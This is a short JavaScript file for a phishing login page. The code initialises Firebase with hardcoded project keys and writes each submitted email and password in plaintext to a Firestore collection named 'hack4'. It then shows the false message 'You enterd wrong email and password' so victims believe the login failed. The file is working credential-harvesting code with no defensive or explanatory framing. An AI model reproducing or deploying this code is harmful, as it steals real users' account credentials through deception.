const firebaseConfig = {
    apiKey: "AIzaSyBaAXmU3KU2EiMRUinqq9svxQtI65wwxpA",
    authDomain: "formdata-b7401.firebaseapp.com",
    projectId: "formdata-b7401",
    storageBucket: "formdata-b7401.appspot.com",
    messagingSenderId: "44569804899",
    appId: "1:44569804899:web:ffe6af4efafd322d09b856"
  };
  firebase.initializeApp(firebaseConfig);
var firestore= firebase.firestore();
const db= firestore.collection("hack4");
 
 let submitButton =document.getElementById('submit');
 submitButton.addEventListener("click",(e) => {
e.preventDefault();
 
var email=document.getElementById("email").value;
var password=document.getElementById("password").value;
 
 if(email==""||!(/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/).test(email)){if(email=="") alert("enter email ..."); else alert("email not correct...")}
 
else{
 var  date=Date();
db.doc(date).set({ 
 email:email,
 password:password, date:date,
}).then(()=>{
alert(" You enterd wrong email and password ... ");
document.getElementById('email').value="";
document.getElementById('password').value="";

}).catch((error)=>{
    console.log(error)
})
}
});

 